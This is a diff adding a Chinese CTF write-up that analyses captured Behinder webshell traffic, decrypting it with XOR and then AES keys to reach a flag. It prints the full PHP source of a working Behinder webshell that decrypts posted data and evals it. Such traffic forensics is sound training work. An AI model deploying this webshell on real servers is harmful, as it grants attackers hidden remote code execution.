@@ -3823,7 +3823,84 @@ if __name__ == "__main__":
 ![](./imgs/image-20260113200543129.png)
 
 
+## 题目名称 Three&Four
 
+附件给了一个pcapng流量包，打开追踪HTTP流
+
+![](imgs/image-20260114100657352.png)
+
+webshell流量分析做的比较多的师傅看到`Tx`这个开头应该会感觉很眼熟
+
+如果不眼熟也没事，这种情况一共就几种可能，无非是看看Base64解码后是不是明文
+
+如果不是明文，就是要异或或者AES解密，可以拿默认密钥试试
+
+![](imgs/image-20260114102426871.png)
+
+尝试后发现其实就是冰蝎流量，加密方式就是异或，然后密钥为默认密钥：`e45e329feb5d925b`
+
+
+具体的原理可以参考我的[这篇博客](https://goodlunatic.github.io/posts/5422d65/#%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90)
+
+
+知道加密算法和密钥后，我们一个个数据包解过去即可，解到HTTP流4的时候就可以得到一个新的冰蝎马
+
+![](imgs/image-20260114102702388.png)
+
+![](imgs/image-20260114102748970.png)
+
+![](imgs/image-20260114102807386.png)
+
+```php
+<?php
+@error_reporting(0);
+session_start();
+    $key="d9e960ecb3005f65";
+	$_SESSION['k']=$key;
+	$post=file_get_contents("php://input");
+	if(!extension_loaded('openssl'))
+	{
+		$t="base64_"."decode";
+		$post=$t($post."");
+		
+		for($i=0;$i<strlen($post);$i++) {
+    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
+    			}
+	}
+	else
+	{
+		$post=openssl_decrypt($post, "AES128", $key);
+	}
+    $arr=explode('|',$post);
+    $func=$arr[0];
+    $params=$arr[1];
+	class C{public function __invoke($p) {eval($p."");}}
+    @call_user_func(new C(),$params);
+?>
+```
+
+然后这个马只不过是把密钥给改了，现在的密钥变成了：`d9e960ecb3005f65`
+
+然后加密算法是异或还是AES，也可以尝试一下，尝试后发现是AES-CBC
+
+具体的原理还是可以参考我的[这篇博客](https://goodlunatic.github.io/posts/5422d65/#%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90)
+
+![](imgs/image-20260114103122388.png)
+
+![](imgs/image-20260114103111561.png)
+
+然后一路解密下去就行，解到HTTP流9的时候即可得到flag
+
+
+![](imgs/image-20260114103347556.png)
+
+![](imgs/image-20260114103419812.png)
+
+![](imgs/image-20260114103436269.png)
+
+`flag{460e2f89-99b3-4065-9c20-c10cc15248a3}`
+
+## 题目名称 
 
 
 
